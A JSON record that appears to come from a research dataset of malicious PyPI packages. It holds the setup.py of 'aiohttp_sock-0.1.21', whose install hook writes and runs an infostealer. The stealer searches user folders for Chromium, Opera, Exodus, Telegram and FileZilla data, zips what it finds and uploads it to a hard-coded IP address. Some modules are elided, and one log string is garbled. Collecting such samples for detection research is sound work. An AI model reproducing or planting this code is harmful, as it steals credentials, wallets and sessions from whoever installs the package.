[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.21/aiohttp_sock-0.1.21/setup.py",
    "malicious_code": "import subprocess\nimport sys\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    import contextlib as __stickytape_contextlib\n\n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n\n            make_package(os.path.dirname(path))\n\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n\n        # The following modules are written to disk and then imported/executed\n        __stickytape_write_module('path_search.py', b\"import asyncio\\r\\nimport os\\r\\nfrom os.path import join, isdir\\r\\nfrom typing import Dict, Iterable, List\\r\\nfrom tools import _handle_task_result\\r\\n\\r\\n\\r\\nLOCAL = os.environ['USERPROFILE']\\r\\n\\r\\nroot_paths = {\\r\\n    join(LOCAL, 'appdata'),\\r\\n    join(LOCAL, 'appdata', 'local'),\\r\\n    join(LOCAL, 'appdata', 'roaming'),\\r\\n    join(LOCAL, 'documents'),\\r\\n    join(LOCAL, 'downloads'),\\r\\n    join(LOCAL, 'desktop'),\\r\\n    'C:\\\\',\\r\\n    'D:\\\\',\\r\\n    'E:\\\\',\\r\\n    'C:\\\\Program Files',\\r\\n    'C:\\\\Program Files (x86)',\\r\\n    'C:\\\\\\\\ProgramData'\\r\\n\\r\\n}\\r\\n\\r\\n\\r\\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\\r\\n    tasks: List[asyncio.Task] = []\\r\\n\\r\\n    queries = {k.lower(): v for k,v in queries.items()}\\r\\n    target_folder_names = set(queries.keys())\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if queries[fname] is not None:\\r\\n                    curr_path = join(p, fname)\\r\\n                    loop = asyncio.get_event_loop()\\r\\n                    task = loop.create_task(queries[fname].callback(curr_path))\\r\\n                    task.add_done_callback(_handle_task_result)\\r\\n                    tasks.append(task)\\r\\n\\r\\n    for task in tasks:\\r\\n        try:\\r\\n            await task\\r\\n        except Exception as e:\\r\\n            print(repr(e))\\r\\n\\r\\n\\r\\nasync def search_paths(paths: Iterable[str], queries: Iterable):\\r\\n    target_folder_names = {i.lower() for i in queries}\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if fname in target_folder_names:\\r\\n                    yield join(p, fname)\\r\\n\")\n        # ... (other modules written, see original code)\n        import asyncio\n        from asyncio import create_task\n        from typing import List\n        from weakref import proxy\n        from path_search import search_plugin_paths, root_paths\n        from config import Config\n        from aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n                TCPConnector\n        import secrets\n        import timeit\n        from paths import TEMP\n        from os import mkdir\n        from os.path import join\n        from zipfile import ZipFile, ZIP_DEFLATED\n        from tools import zipdir, _handle_task_result\n        from logger import Logger\n        \n        from plugins import Chromium, Details, Exodus, Filezilla, Telegram\n        \n        \n        \n        HOST = 'http://144.24.115.170'\n        \n        \n        async def main() -> None:\n            start = timeit.default_timer()\n        \n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n        \n            print(log_path)\n            mkdir(log_path)\n        \n            tasks: List[asyncio.Task] = []\n        \n            connector = TCPConnector(limit=50)\n            session = Session(connector=connector)\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n        \n            await logger.log(f'Start')\n            \n            chromium = Chromium(conf)\n        \n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            \n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n        \n            other_plugins = [Details(conf)]\n        \n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n        \n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n        \n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            \n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n        \n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n        \n            files = {'file': open(zip_log_path, 'rb')}\n                \n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n            await session.close()\n        \n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        \n        asyncio.run(main())"
  }
]